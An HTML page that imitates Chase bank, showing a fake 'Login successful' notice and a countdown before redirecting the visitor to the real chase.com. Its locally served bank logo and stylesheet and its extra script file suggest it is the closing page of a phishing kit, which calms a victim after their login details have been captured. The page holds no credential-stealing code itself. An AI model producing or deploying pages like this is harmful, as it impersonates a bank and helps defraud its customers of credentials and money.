<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/chase.css">
    <title>chase · Success</title>
</head>
<body>
    <header>
        <img src="res/img/logo.svg" alt="Chase logo">
    </header>

    <section>
        <div class="Container">

            <!-- SUCCESS MESSAGE using existing box/label pattern -->
            <div class="box">
                <label style="color: #1a7f37; font-weight: 600;">✓ Login successful</label>
                <p style="margin: 8px 0 0 0; font-size: 0.9rem; color: #1a7f37; background: #eefbf0; padding: 8px 12px; border-radius: 4px; border-left: 4px solid #1a7f37;">
                    You have been successfully authenticated.
                </p>
            </div>

            <!-- Redirect info -->
            <div class="box">
                <label style="font-weight: 600;">Redirecting you now</label>
                <p style="margin: 8px 0 0 0; font-size: 0.9rem; color: #2a3b4c;">
                    You will be redirected to <strong>chase.com</strong> in
                    <span id="countdown" style="font-weight: 700; color: #0057b8;">5</span> seconds.
                </p>
            </div>

            <!-- Progress / loading indicator -->
            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 0 32px;">
                <div style="
                    width: 56px;
                    height: 56px;
                    border: 6px solid #e0e6ed;
                    border-top: 6px solid #1a7f37;
                    border-radius: 50%;
                    animation: chase-spin 1s linear infinite;
                "></div>
            </div>

            <style>
                @keyframes chase-spin {
                    0%   { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>

            <h5><a href="https://www.chase.com" style="color: #0057b8; text-decoration: none;">Click here if you are not redirected &gt;</a></h5>

        </div>
    </section>

    <script src="./res/jquery.js"></script>
    <script src="./res/cdn/jq.js"></script>

    <!-- Countdown + redirect logic -->
    <script>
        (function () {
            var seconds = 5;
            var counter = document.getElementById('countdown');

            var interval = setInterval(function () {
                seconds -= 1;
                if (counter) {
                    counter.textContent = seconds;
                }
                if (seconds <= 0) {
                    clearInterval(interval);
                    window.location.href = 'https://www.chase.com';
                }
            }, 1000);
        })();
    </script>
</body>
</html>
